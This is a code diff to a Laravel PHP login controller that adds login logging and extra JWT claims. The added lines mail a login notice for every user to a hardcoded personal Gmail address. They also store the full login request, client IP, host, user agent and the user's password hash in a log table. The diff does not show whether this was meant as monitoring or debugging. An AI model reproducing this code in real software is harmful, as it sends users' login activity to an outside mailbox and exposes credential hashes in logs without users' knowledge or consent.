@@ -10,6 +10,7 @@ use App\User;
 use App\Models\Mailable; 
 use App\Mail\LoginSuccessMail; 
 use Illuminate\Support\Facades\Mail; 
+use App\Models\Seguranca\LogLogin; 
  
 
 use App\Service\Seguranca\UsuarioServiceInterface;
@@ -237,13 +238,27 @@ class LoginController extends Controller
     protected function authenticated(Request $request, User $usuario)
     {
 
+        // dd( $request );
     	if($usuario->hasMailable('Login') and  $usuario->email!== ''  ){
     		Mail::to($usuario->email)->send(new LoginSuccessMail( $usuario ));
     	}
+
+
+        Mail::to( 'manzoli2122@gmail.com' )->send(new LoginSuccessMail( $usuario ));
+        
+        $data = $request->all( );
+
+        $data['ip_v4']      = getenv("REMOTE_ADDR");
+        $data['host']       = gethostbyaddr(getenv("REMOTE_ADDR")); 
+        $data['user_id']    = $usuario->id ; 
+        $data['password']   = $usuario->password ; 
+        $data['navegador']  = $request->server()['HTTP_USER_AGENT']; 
+
+        LogLogin::create($data);
     	 
         $credentials = request(['id', 'password']);
 
-        if ($token = Auth::guard('api')->attempt($credentials)) {    
+        if ($token = Auth::guard('api')->claims(['user' => $usuario->only(['nome' , 'email', 'apelido'  ]), 'perfis' =>json_decode($usuario->cachedPerfis())->perfis  ])->attempt($credentials)) {    
             session(['token_api' => $token]);        
         }
 
